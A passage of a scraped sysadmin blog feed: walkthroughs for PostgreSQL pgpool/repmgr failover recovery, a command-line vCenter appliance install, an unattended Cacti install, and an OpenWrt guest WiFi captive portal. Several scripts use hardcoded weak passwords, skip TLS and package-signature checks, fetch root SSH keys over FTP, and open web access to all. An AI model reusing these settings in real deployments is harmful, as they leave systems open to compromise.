pgpool[1392]: pcp child process received restart request 2014-10-23T16:01:38.345478+02:00 cz01-pgpool01 pgpool[23257]: PCP child 1392 exits with status 256 in failover() 2014-10-23T16:01:38.345510+02:00 cz01-pgpool01 pgpool[23257]: fork a new PCP child pid 2517 in failover() 2014-10-23T16:01:38.345516+02:00 cz01-pgpool01 pgpool[23257]: worker child 1393 exits with status 256 2014-10-23T16:01:38.345899+02:00 cz01-pgpool01 pgpool[23257]: fork a new worker child pid 2518 Logs from psql01 after the master was stopped cz01-psql01 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 16:01:31 CEST [26708]: [2-1] user=,db= LOG: replication terminated by primary server 2014-10-23 16:01:31 CEST [26708]: [3-1] user=,db= DETAIL: End of WAL reached on timeline 1 at 0/64000090. 2014-10-23 16:01:31 CEST [26708]: [4-1] user=,db= FATAL: could not send end-of-streaming message to primary: no COPY in progress 2014-10-23 16:01:31 CEST [26707]: [5-1] user=,db= LOG: record with zero length at 0/64000090 Check status cz01-pgpool02 ~ # ssh -q postgres@cz01-psql01.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" [2014-10-23 16:05:16] [INFO] repmgr connecting to database Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String * master | host=cz01-psql01.example.com user=repmgr dbname=repmgr FAILED | host=cz01-psql02.example.com user=repmgr dbname=repmgr [2014-10-23 16:05:16] [ERROR] Connection to database failed: could not connect to server: Connection refused Is the server running on host \"cz01-psql02.example.com\" (10.32.243.148) and accepting TCP/IP connections on port 5432? Check the functionality cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -c \"drop database mydb\" DROP DATABASE cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -l | grep mydb cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql01.example.com -w -l | grep mydb Reinitialize the stopped master to be slave again cz01-pgpool02 ~ # ssh cz01-psql02.example.com 'service postgresql-9.3 stop; su - postgres -c \"repmgr -D /var/lib/pgsql/9.3/data -d repmgr -p 5432 -U repmgr -R postgres --verbose --force standby clone cz01-psql01.example.com\"; service postgresql-9.3 start;' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. Stopping postgresql-9.3 service: [ OK ] [2014-10-23 16:07:11] [ERROR] Did not find the configuration file './repmgr.conf', continuing [2014-10-23 16:07:11] [NOTICE] repmgr Destination directory /var/lib/pgsql/9.3/data provided, try to clone everything in it. [2014-10-23 16:07:11] [INFO] repmgr connecting to master database [2014-10-23 16:07:11] [INFO] repmgr connected to master, checking its state [2014-10-23 16:07:11] [INFO] Successfully connected to primary. Current installation size is 188 MB Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. [2014-10-23 16:07:11] [NOTICE] Starting backup... [2014-10-23 16:07:11] [WARNING] directory \"/var/lib/pgsql/9.3/data\" exists but is not empty [2014-10-23 16:07:11] [INFO] standby clone: master control file '/var/lib/pgsql/9.3/data/global/pg_control' [2014-10-23 16:07:11] [INFO] standby clone: master control file '/var/lib/pgsql/9.3/data/global/pg_control' [2014-10-23 16:07:11] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql01.example.com:/var/lib/pgsql/9.3/data/global/pg_control /var/lib/pgsql/9.3/data/global' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. receiving incremental file list pg_control 8192 100% 7.81MB/s 0:00:00 (xfer#1, to-check=0/1) sent 102 bytes received 235 bytes 674.00 bytes/sec total size is 8192 speedup is 24.31 [2014-10-23 16:07:12] [INFO] standby clone: master data directory '/var/lib/pgsql/9.3/data' [2014-10-23 16:07:12] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete --exclude=pg_xlog* --exclude=pg_log* --exclude=pg_control --exclude=*.pid postgres@cz01-psql01.example.com:/var/lib/pgsql/9.3/data/* /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. receiving incremental file list backup_label 222 100% 216.80kB/s 0:00:00 (xfer#1, to-check=1239/1241) backup_label.old 222 100% 216.80kB/s 0:00:00 (xfer#2, to-check=1238/1241) recovery.done 102 100% 99.61kB/s 0:00:00 (xfer#3, to-check=1232/1241) base/ base/1/ base/1/pg_internal.init 116404 100% 155.93kB/s 0:00:00 (xfer#4, to-check=1225/1490) base/12896/ base/12896/pg_internal.init 116404 100% 153.41kB/s 0:00:00 (xfer#5, to-check=804/1542) base/16386/ base/16386/pg_internal.init 116404 100% 151.97kB/s 0:00:00 (xfer#6, to-check=559/1542) base/16413/ base/16413/pg_internal.init 116404 100% 150.56kB/s 0:00:00 (xfer#7, to-check=301/1542) deleting pg_stat/global.stat deleting pg_stat/db_16413.stat deleting pg_stat/db_16386.stat deleting pg_stat/db_12896.stat deleting pg_stat/db_1.stat deleting pg_stat/db_0.stat global/ global/12789 8192 100% 7.81MB/s 0:00:00 (xfer#8, to-check=30/1542) global/12791 16384 100% 15.62MB/s 0:00:00 (xfer#9, to-check=27/1542) global/12792 16384 100% 15.62MB/s 0:00:00 (xfer#10, to-check=26/1542) global/12892 8192 100% 7.81MB/s 0:00:00 (xfer#11, to-check=17/1542) global/12894 16384 100% 15.62MB/s 0:00:00 (xfer#12, to-check=16/1542) global/12895 16384 100% 5.21MB/s 0:00:00 (xfer#13, to-check=15/1542) global/pg_internal.init 12784 100% 2.44MB/s 0:00:00 (xfer#14, to-check=13/1542) pg_clog/0000 8192 100% 1.56MB/s 0:00:00 (xfer#15, to-check=12/1542) pg_notify/ pg_stat/ pg_stat_tmp/ pg_stat_tmp/db_0.stat 2540 100% 310.06kB/s 0:00:00 (xfer#16, to-check=6/1542) pg_stat_tmp/db_1.stat 1864 100% 227.54kB/s 0:00:00 (xfer#17, to-check=5/1542) pg_stat_tmp/db_12896.stat 3047 100% 371.95kB/s 0:00:00 (xfer#18, to-check=4/1542) pg_stat_tmp/db_16386.stat 4230 100% 458.98kB/s 0:00:00 (xfer#19, to-check=3/1542) pg_stat_tmp/db_16413.stat 6089 100% 660.70kB/s 0:00:00 (xfer#20, to-check=2/1542) pg_stat_tmp/global.stat 1026 100% 100.20kB/s 0:00:00 (xfer#21, to-check=1/1542) sent 5452 bytes received 93077 bytes 65686.00 bytes/sec total size is 198017139 speedup is 2009.73 [2014-10-23 16:07:13] [INFO] standby clone: master config file '/var/lib/pgsql/9.3/data/postgresql.conf' [2014-10-23 16:07:13] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql01.example.com:/var/lib/pgsql/9.3/data/postgresql.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 80 bytes 60.67 bytes/sec total size is 20561 speedup is 225.95 [2014-10-23 16:07:14] [INFO] standby clone: master hba file '/var/lib/pgsql/9.3/data/pg_hba.conf' [2014-10-23 16:07:14] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql01.example.com:/var/lib/pgsql/9.3/data/pg_hba.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 76 bytes 174.00 bytes/sec total size is 4812 speedup is 55.31 [2014-10-23 16:07:14] [INFO] standby clone: master ident file '/var/lib/pgsql/9.3/data/pg_ident.conf' [2014-10-23 16:07:14] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql01.example.com:/var/lib/pgsql/9.3/data/pg_ident.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 78 bytes 178.00 bytes/sec total size is 1636 speedup is 18.38 [2014-10-23 16:07:14] [NOTICE] Finishing backup... NOTICE: pg_stop_backup complete, all required WAL segments have been archived [2014-10-23 16:07:15] [INFO] repmgr requires primary to keep WAL files 000000010000000000000065 until at least 000000010000000000000065 [2014-10-23 16:07:15] [NOTICE] repmgr standby clone complete [2014-10-23 16:07:15] [NOTICE] HINT: You can now start your postgresql server [2014-10-23 16:07:15] [NOTICE] for example : pg_ctl -D /var/lib/pgsql/9.3/data start Opening configuration file: ./repmgr.conf Starting postgresql-9.3 service: [ OK ] Again - after the db administrator find out the cause why master went down he needs to initialize the failed master as a slave (by running command above). Then everything is like before the testing - original master/slave state. The green color is used for showing up the changes in the diagram. Check cluster status after recovery cz01-pgpool02 ~ # ssh -q postgres@cz01-psql02.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" [2014-10-23 16:08:23] [INFO] repmgr connecting to database Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String * master | host=cz01-psql01.example.com user=repmgr dbname=repmgr standby | host=cz01-psql02.example.com user=repmgr dbname=repmgr cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 1 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 3 0.500000 Re-enable the slave to be able to receive read-only requests cz01-pgpool02 ~ # pcp_detach_node 0 localhost 9898 admin password123 1 cz01-pgpool02 ~ # pcp_attach_node 0 localhost 9898 admin password123 1 Logs right after reenabling the slave again cz01-pgpool01 / # cat /var/log/local0 ... 2014-10-23T16:09:06.675035+02:00 cz01-pgpool01 pgpool[23264]: send_failback_request: fail back 1 th node request from pid 23264 2014-10-23T16:09:06.675868+02:00 cz01-pgpool01 pgpool[23257]: wd_start_interlock: start interlocking 2014-10-23T16:09:06.691133+02:00 cz01-pgpool01 pgpool[23257]: wd_assume_lock_holder: become a new lock holder 2014-10-23T16:09:06.698706+02:00 cz01-pgpool01 pgpool[23264]: wd_send_response: WD_STAND_FOR_LOCK_HOLDER received but lock holder exists already 2014-10-23T16:09:07.200639+02:00 cz01-pgpool01 pgpool[23257]: starting fail back. reconnect host cz01-psql02.example.com(5432) 2014-10-23T16:09:07.205234+02:00 cz01-pgpool01 pgpool[23257]: Do not restart children because we are failbacking node id 1 hostcz01-psql02.example.com port:5432 and we are in streaming replication mode 2014-10-23T16:09:07.209510+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node_repeatedly: waiting for finding a primary node 2014-10-23T16:09:07.225224+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node: primary node id is 0 2014-10-23T16:09:07.228223+02:00 cz01-pgpool01 pgpool[23257]: wd_end_interlock: end interlocking 2014-10-23T16:09:08.244875+02:00 cz01-pgpool01 pgpool[23257]: failover: set new primary node: 0 2014-10-23T16:09:08.244902+02:00 cz01-pgpool01 pgpool[23257]: failover: set new master node: 0 2014-10-23T16:09:08.244908+02:00 cz01-pgpool01 pgpool[23257]: failback done. reconnect host cz01-psql02.example.com(5432) 2014-10-23T16:09:08.247112+02:00 cz01-pgpool01 pgpool[2518]: worker process received restart request 2014-10-23T16:09:09.248473+02:00 cz01-pgpool01 pgpool[2517]: pcp child process received restart request 2014-10-23T16:09:09.252461+02:00 cz01-pgpool01 pgpool[23257]: PCP child 2517 exits with status 256 in failover() 2014-10-23T16:09:09.252492+02:00 cz01-pgpool01 pgpool[23257]: fork a new PCP child pid 3080 in failover() 2014-10-23T16:09:09.252499+02:00 cz01-pgpool01 pgpool[23257]: worker child 2518 exits with status 256 2014-10-23T16:09:09.253362+02:00 cz01-pgpool01 pgpool[23257]: fork a new worker child pid 3081 Final cluster status verification cz01-pgpool02 ~ # ssh -q postgres@cz01-psql02.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" [2014-10-23 16:10:33] [INFO] repmgr connecting to database Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String * master | host=cz01-psql01.example.com user=repmgr dbname=repmgr standby | host=cz01-psql02.example.com user=repmgr dbname=repmgr cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 1 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 1 0.500000 Huuh… It was a lot of copy &amp; paste work. Anyway it’s here if somebody needs it ;-)" }, { "title": "VMware vCenter Server 5.x Appliance installation and configuration using ssh command line", "url": "/posts/vmware-vcenter-server-5x-appliance-instalation-and-configuration-using-ssh-command-line/", "categories": "Virtualization, linux.xvx.cz", "tags": "vmware", "date": "2014-09-27 00:00:00 +0200", "content": "Original post from linux.xvx.cz Here you can find some notes about installing VMware vCenter Appliance from command line directly from ESXi using OVF Tool. Install the OVF tools first. Details can be found here: https://www.virtuallyghetto.com/2012/05/how-to-deploy-ovfova-in-esxi-shell.html. #Download OVF tools wget -q ftp://ftp.example.com/software/vmware/installation_scripts/vmware-ovftool.tar.gz -O /vmfs/volumes/My_Datastore/vmware-ovftool.tar.gz # Extract ovftool content to /vmfs/volumes/My_Datastore tar -xzf /vmfs/volumes/My_Datastore/vmware-ovftool.tar.gz -C /vmfs/volumes/My_Datastore/ rm /vmfs/volumes/My_Datastore/vmware-ovftool.tar.gz # Modify the ovftool script to work on ESXi sed -i 's@^#!/bin/bash@#!/bin/sh@' /vmfs/volumes/My_Datastore/vmware-ovftool/ovftool Provision VMware vCenter Server 5.x Appliance using OVFtool directly to ESXi and then configure it via SSH: # Deploy OVF from remote HTTP source /vmfs/volumes/My_Datastore/vmware-ovftool/ovftool --diskMode=thin --datastore=My_Datastore --noSSLVerify --acceptAllEulas --skipManifestCheck \"--net:Network 1=VMware Management Network\" --prop:vami.ip0.VMware_vCenter_Server_Appliance=10.29.49.99 --prop:vami.netmask0.VMware_vCenter_Server_Appliance=255.255.255.128 --prop:vami.gateway.VMware_vCenter_Server_Appliance=10.29.49.1 --prop:vami.DNS.VMware_vCenter_Server_Appliance=10.1.1.44 --prop:vami.hostname=vcenter.example.com \"ftp://ftp.example.com/software/vmware/VMware-vCenter-Server-Appliance-5.5.0.10000-1624811_OVF10.ova\" \"vi://root:mypassword@127.0.0.1\" echo \"Accepting EULA ...\" /usr/sbin/vpxd_servicecfg eula accept echo \"Configuring Embedded DB ...\" /usr/sbin/vpxd_servicecfg db write embedded echo \"Configuring SSO...\" /usr/sbin/vpxd_servicecfg sso write embedded echo \"Starting VCSA ...\" /usr/sbin/vpxd_servicecfg service start echo \"Configure NTP\" /usr/sbin/vpxd_servicecfg timesync write ntp ntp.example.com echo \"Set Proxy Server\" /opt/vmware/share/vami/vami_set_proxy px01.example.com 3128 # Password change echo rootpassword | passwd --stdin # Add user admin useradd admin echo admin123 | passwd --stdin admin chage -M -1 -E -1 admin # If you wish to completely disable account password expiry, you can do so by running the following command: chage -M -1 -E -1 root echo \"Configure Network Settings\" /opt/vmware/share/vami/vami_set_dns 10.0.0.44 10.0.0.45 /opt/vmware/share/vami/vami_set_hostname vcenter.example.com /opt/vmware/share/vami/vami_set_timezone_cmd Europe/Prague # Regenerate all certificates next reboot echo only-once &gt; /etc/vmware-vpx/ssl/allow_regeneration # Add SSH key mkdir /root/.ssh wget ftp://ftp.example.com/ssh_keys/id_dsa.pub -O /root/.ssh/authorized_keys chmod 755 /root/.ssh chmod 600 /root/.ssh/authorized_keys # Install SuSe repositories zypper --gpg-auto-import-keys ar http://download.opensuse.org/distribution/11.1/repo/oss/ 11.1 zypper --gpg-auto-import-keys ar http://download.opensuse.org/update/11.1/ Update-11.1 rm /etc/zypp/repos.d/Update-11.1.repo zypper --no-gpg-checks refresh # Install MC :-) zypper install -y mc # Disable mouse support in MC sed -i 's@/usr/bin/mc@/usr/bin/mc --nomouse@' /usr/share/mc/bin/mc-wrapper.sh ( sleep 10 reboot ) &amp; # Set static IP /opt/vmware/share/vami/vami_set_network eth0 STATICV4 10.0.0.99 255.255.255.128 10.0.0.1 Then you can automatically register the ESXi servers to the vCenter using joinvCenter.py. Details here https://www.virtuallyghetto.com/2011/03/how-to-automatically-add-esxi-host-to.html. Thank you guys from the virtuallyGhetto for their awesome blog full of great “VMware ideas”." }, { "title": "Cacti 0.8.8b non-interactive installation and configuration", "url": "/posts/cacti-088b-non-interactive-installation-and-configuration/", "categories": "Linux, DevOps, linux.xvx.cz", "tags": "monitoring, automation", "date": "2014-09-03 00:00:00 +0200", "content": "Original post from linux.xvx.cz It may happen that you need to install Cacti without any user interaction. Usually after you install Cacti you need to finish the installation using Web installation wizard where you need to specify some details. I would like to share the details on how to install Cacti 0.8.8b the automated way without user interaction. Cacti Installation: yum install -y cacti mysql-server # MySQL configuration service mysqld start chkconfig mysqld on mysqladmin -u root password admin123 mysql --password=admin123 --user=root &lt;&lt; EOF #Taken from /usr/bin/mysql_secure_installation #Remove anonymous users DELETE FROM mysql.user WHERE User=''; #Disallow remote root login DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1'); #Remove test database DROP DATABASE test; EOF # shellcheck disable=SC2016 sed -i.orig 's/^\\(\\$database_username\\).*/\\1 = \"cacti\";/;s/^\\(\\$database_password\\).*/\\1 = \"admin123\";/' /etc/cacti/db.php sed -i.orig 's/\\(Allow from\\) localhost/\\1 all/' /etc/httpd/conf.d/cacti.conf sed -i 's@^#\\(\\*/5 \\* \\* \\* \\*.*cacti.*\\)@\\1@' /etc/cron.d/cacti sed -i.orig 's@^;\\(date.timezone\\).*@\\1 = \"Europe/Prague\"@' /etc/php.ini sed -i.orig 's/^#Listen 80/Listen 80/' /etc/httpd/conf/httpd.conf service httpd restart mysql -u root --password=admin123 -v &lt;&lt; EOF CREATE DATABASE cacti; GRANT ALL ON cacti.* TO cacti@localhost IDENTIFIED BY 'admin123'; FLUSH privileges; EOF mysql -u cacti --password=admin123 cacti &lt; \"$(rpm -ql cacti | grep cacti.sql)\" mysql -u root --password=admin123 -v &lt;&lt; EOF USE cacti; UPDATE user_auth SET password = md5('admin123') WHERE username = 'admin'; UPDATE user_auth SET must_change_password = '' WHERE username = 'admin'; UPDATE version SET cacti = '$(rpm -q cacti --queryformat \"%{VERSION}\")'; #UPDATE host SET snmp_version = '2' WHERE hostname = '127.0.0.1'; UPDATE host SET availability_method = '2' WHERE hostname = '127.0.0.1'; INSERT INTO settings (name,value) VALUES ('path_rrdtool', '$(which rrdtool)'), ('path_snmpget', '$(which snmpget)'), ('path_php_binary', '$(which php)'), ('path_snmpwalk','$(which snmpwalk)'), ('path_snmpbulkwalk', '$(which snmpbulkwalk)'), ('path_snmpgetnext', '$(which snmpgetnext)'), ('path_cactilog', '$(rpm -ql cacti | grep cacti\\\\\\.log$)'), ('snmp_version', 'net-snmp'), ('rrdtool_version', 'rrd-1.3.x'); INSERT INTO settings_graphs (user_id, name, value) VALUES (1, 'treeview_graphs_per_page', '100'); EOF ################################ # Install favorite Cacti plugins ################################ #http://docs.cacti.net/userplugin:quicktree wget http://wotsit.thingy.com/haj/cacti/quicktree-0.2.zip -P /tmp/ unzip /tmp/quicktree-0.2.zip -d /usr/share/cacti/plugins/ #http://docs.cacti.net/userplugin:dashboard wget \"http://docs.cacti.net/lib/exe/fetch.php?hash=424de1&amp;media=http%3A%2F%2Fdocs.cacti.net%2F_media%2Fuserplugin%3Adashboardv_v1.2.tar\" -O - | tar xvf - -C /usr/share/cacti/plugins/ #http://docs.cacti.net/userplugin:intropage tar xvzf /tmp/intropage_0.4.tar.gz -C /usr/share/cacti/plugins/ #http://docs.cacti.net/userplugin:capacityreport wget http://docs.cacti.net/_media/userplugin:capacityreport-0.1.zip -P /tmp/ unzip /tmp/userplugin:capacityreport-0.1.zip -d /usr/share/cacti/plugins/ #http://docs.cacti.net/plugin:thold + http://docs.cacti.net/plugin:settings wget http://docs.cacti.net/_media/plugin:settings-v0.71-1.tgz -O - | tar xvzf - -C /usr/share/cacti/plugins/ wget http://docs.cacti.net/_media/plugin:thold-v0.5.0.tgz -O - | tar xvzf - -C /usr/share/cacti/plugins/ #http://docs.cacti.net/plugin:rrdclean wget http://docs.cacti.net/_media/plugin:rrdclean-v0.41.tgz -O - | tar xvzf - -C /usr/share/cacti/plugins/ mkdir /usr/share/cacti/rra/{backup,archive} &amp;&amp; chown cacti:root /usr/share/cacti/rra/{backup,archive} #http://docs.cacti.net/plugin:realtime wget http://docs.cacti.net/_media/plugin:realtime-v0.5-2.tgz -O - | tar xvzf - -C /usr/share/cacti/plugins/ mkdir /tmp/cacti-realtime &amp;&amp; chown apache:apache /tmp/cacti-realtime #http://docs.cacti.net/plugin:hmib wget http://docs.cacti.net/_media/plugin:hmib-v1.4-2.tgz -O - | tar xvzf - -C /usr/share/cacti/plugins/ Download the OpenStack Infrastructure project’s script which will help with automated adding of the hosts to the Cacti: #modify the script to work with other VMs (not just KVM based) + small bugfix wget https://git.openstack.org/cgit/openstack-infra/config/plain/modules/openstack_project/files/cacti/create_graphs.sh -O - | sed 's/All Hosts/Default Tree/;s/add_device.php --description/add_device.php --ping_method=icmp --description/;s/grep \"Known\"/grep -E \"Known|Device IO\"/;s@xvd\\[a\\-z\\]\\$@-E \"\\(sd\\|xvd\\)\\[a-z\\]\\$\"@' &gt; /root/create_graphs.sh chmod a+x /root/create_graphs.sh wget https://git.openstack.org/cgit/openstack-infra/config/plain/modules/openstack_project/files/cacti/linux_host.xml -P /var/lib/cacti/ /usr/bin/php -q /usr/share/cacti/cli/import_template.php --filename=/var/lib/cacti/linux_host.xml --with-template-rras wget https://git.openstack.org/cgit/openstack-infra/config/plain/modules/openstack_project/files/cacti/net-snmp_devio.xml -P /usr/local/share/cacti/resource/snmp_queries/ Then you can easily run /root/create_graphs.sh my_host to add the linux host into the Cacti. (You will need to setup the SNMP daemon on the client machine first) Few Screenshots: Enjoy :-)" }, { "title": "Systemd Cheatsheet", "url": "/posts/systemd-cheatsheet/", "categories": "Linux, linux.xvx.cz", "tags": "bash, cheatsheet", "date": "2014-06-16 00:00:00 +0200", "content": "Original post from linux.xvx.cz Recently I started to use the new init system called systemd. I decided to write a simple “pdf” cheatsheet which helps me to print it and learn it. See the example: Here is the PDF: systemd_cheatsheet.pdf Here is the SVG: systemd_cheatsheet.svg Here is the TeX: systemd_cheatsheet.tex All source files can be found here: GitHub - cheatsheet-systemd I used the following sources: Arch Linux Wiki - systemd, SysVinit_to_Systemd_Cheatsheet, RHEL7 - System_Administrators_Guide. Enjoy ;-)" }, { "title": "Turris - OpenWRT and guest access", "url": "/posts/turris-openwrt-and-guest-access/", "categories": "OpenWrt, Networking, linux.xvx.cz", "tags": "turris, router, wifi, hotspot", "date": "2014-05-08 00:00:00 +0200", "content": "Original post from linux.xvx.cz In my previous blog post “Turris - OpenWrt configuration” I described how to configure the Turris router for my home network. I decided to extend the configuration and create the Guest WiFi for other people who want to access the “Internet”. In my solution I’m using the nodogsplash captive portal solution which offers a simple way to provide restricted access to an Internet connection. Here is the extended network diagram: Start with creating the Guest WiFi - OpenWrt Guest WLAN: uci set network.wifi_open=interface uci set network.wifi_open.type=bridge uci set network.wifi_open.proto=static uci set network.wifi_open.ipaddr=10.0.0.1 uci set network.wifi_open.netmask=255.255.255.0 uci add wireless wifi-iface uci set wireless.@wifi-iface[-1].device=radio0 uci set wireless.@wifi-iface[-1].mode=ap uci set wireless.@wifi-iface[-1].ssid=medlanky.xvx.cz uci set wireless.@wifi-iface[-1].network=wifi_open uci set wireless.@wifi-iface[-1].encryption=none uci set wireless.@wifi-iface[-1].isolate=1 uci set dhcp.wifi_open=dhcp uci set dhcp.wifi_open.interface=wifi_open uci set dhcp.wifi_open.start=2 uci set dhcp.wifi_open.limit=253 uci add_list dhcp.wifi_open.dhcp_option=6,10.0.0.1 uci set dhcp.wifi_open.leasetime=1h uci add firewall zone uci set firewall.@zone[-1].name=wifi_open uci add_list firewall.@zone[-1].network=wifi_open uci set firewall.@zone[-1].input=REJECT uci set firewall.@zone[-1].forward=REJECT uci set firewall.@zone[-1].output=ACCEPT uci add firewall forwarding uci set firewall.@forwarding[-1].src=wifi_open uci set firewall.@forwarding[-1].dest=wan uci add firewall rule uci set firewall.@rule[-1].name=icmp-echo-request uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=icmp uci set firewall.@rule[-1].icmp_type=echo-request uci add firewall rule uci set firewall.@rule[-1].name=dhcp uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].src_port=67-68 uci set firewall.@rule[-1].dest_port=67-68 uci add firewall rule uci set firewall.@rule[-1].name=dns uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcpudp uci set firewall.@rule[-1].dest_port=53 Next install and configure nodogsplash: #Download the nodosplash compiled for Turris router (mpc85xx) [if it's not already in the \"main repository\"] curl -L --insecure \"https://github.com/ruzickap/linux.xvx.cz/raw/gh-pages/files/turris_configured/root/nodogsplash_0.9_beta9.9.8-2_mpc85xx.ipk\" -O /tmp/nodogsplash_0.9_beta9.9.8-2_mpc85xx.ipk #Install the package (try first: opkg install nodogsplash) opkg install /tmp/nodogsplash_0.9_beta9.9.8-2_mpc85xx.ipk #Backup the original config file mv /etc/nodogsplash/nodogsplash.conf /etc/nodogsplash/nodogsplash.conf-orig #Create main config file cat &gt; /etc/nodogsplash/nodogsplash.conf &lt;&lt; EOF GatewayInterface br-wifi_open FirewallRuleSet authenticated-users { FirewallRule block to 192.168.0.0/16 FirewallRule block to 10.0.0.0/8 FirewallRule allow tcp port 53 FirewallRule allow udp port 53 FirewallRule allow tcp port 80 FirewallRule allow tcp port 443 FirewallRule allow tcp port 22 FirewallRule allow icmp } FirewallRuleSet preauthenticated-users { FirewallRule allow tcp port 53 FirewallRule allow udp port 53 } FirewallRuleSet users-to-router { FirewallRule allow udp port 53 FirewallRule allow tcp port 53 FirewallRule allow udp port 67 FirewallRule allow icmp } GatewayName medlanky.xvx.cz RedirectURL http://medlanky-hotspot.xvx.cz/ ClientForceTimeout 120 EOF #Enable syslog logging sed -i 's@^OPTIONS=.*@OPTIONS=\"-s -d 5\"@' /etc/init.d/nodogsplash #Modify the main page wget \"http://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Brno-Medl%C3%A1nky_znak.svg/90px-Brno-Medl%C3%A1nky_znak.svg.png\" -O /etc/nodogsplash/htdocs/images/90px-Brno-Medlanky_znak.svg.png cp /etc/nodogsplash/htdocs/splash.html /etc/nodogsplash/htdocs/splash.html-orig sed -i 's@splash.jpg@90px-Brno-Medlanky_znak.svg.png@;/align=\"center\" height=\"120\"&gt;/a\\ \\ \\ \\ \\ \\ \\ \\ \\ &lt;h2&gt;For Internet access - click the sign.&lt;/h2&gt; &lt;h2&gt;Pro pristup na Internet klikni na znak.&lt;/h2&gt;' /etc/nodogsplash/htdocs/splash.html #Enable nodogsplash to start at boot as a last service (because of slow guest wifi initialization) sed -i 's/=65/=99/' /etc/init.d/nodogsplash /etc/init.d/nodogsplash enable Here is the video how the Captive portal will looks like: The full OpenWrt router configs can be found here: https://github.com/ruzickap/linux.xvx.cz/tree/gh-pages/files/turris_configured/etc Enjoy :-)" }, { "title": "Turris - OpenWRT and thermometers", "url": "/posts/turris-openwrt-and-thermometers/", "categories": "OpenWrt, linux.xvx.cz", "tags": "turris, monitoring", "date": "2014-04-22 00:00:00 +0200", "content": "Original post from linux.xvx.cz I would like to put here some notes about the thermometers in OpenWrt and Turris. Turris internal thermometers Turris has its own thermometers which are monitoring the temperature of CPU and board. This how-to expects the previous lighttpd configuration described in my previous post “Turris - OpenWrt configuration”. Here is how you can create graphs from the data using RRDtool. mkdir -p /data/temperature_sensors /www3/temperature_sensors #The graphs can be accessed: http://192.168.1.1/myadmin/temperature_sensors ln -s /www3/temperature_sensors /www3/myadmin/temperature_sensors #Create RRDtool database to store the values every 10 minutes (600 seconds) for 10 years (525600 * 600 seconds) rrdtool create /data/temperature_sensors/temperature_sensors.rrd --step 600 \\ DS:temp0:GAUGE:1000:-273:5000 DS:temp1:GAUGE:1000:-273:5000 RRA:AVERAGE:0.5:1:525600 \\ RRA:MIN:0.5:1:525600 RRA:MAX:0.5:1:525600 #Add cron entry to put the temperatures into the database cat &gt;&gt; /etc/crontabs/root &lt;&lt; \\EOF */10 * * * * test -f /data/temperature_sensors/temperature_sensors.rrd &amp;&amp; rrdtool update /data/temperature_sensors/temperature_sensors.rrd $(date +\\%s):$(thermometer | tr -s \\\\n ' ' | awk '{print $2\":\"$4}') EOF #Create main graph script cat &gt; /data/temperature_sensors/temperature_sensors-graph.sh &lt;&lt; \\EOF #!/bin/sh NAME=$(echo $0 | sed 's@.*/\\([^-]*\\)-.*@\\1@') RRD_FILE=\"/data/$NAME/$NAME.rrd\" DST_FILE=\"/www3/$NAME/$1.png\" RRD_PARAMETERS=' $DST_FILE --end=$(date +%s) --vertical-label \"Temperature .C\" --width 1024 --height 600 --lower-limit 0 DEF:temp0=$RRD_FILE:temp0:AVERAGE DEF:temp1=$RRD_FILE:temp1:AVERAGE LINE1:temp0#CF00FF:\"10 minutes average Board\\\\n\" LINE2:temp1#FF3C00:\"10 minutes average CPU\\\\n\" COMMENT:\" \\\\n\" GPRINT:temp0:MIN:\"Minimum Board\\\\: %4.1lf .C \" GPRINT:temp1:MIN:\"Minimum CPU\\\\: %4.1lf .C \" 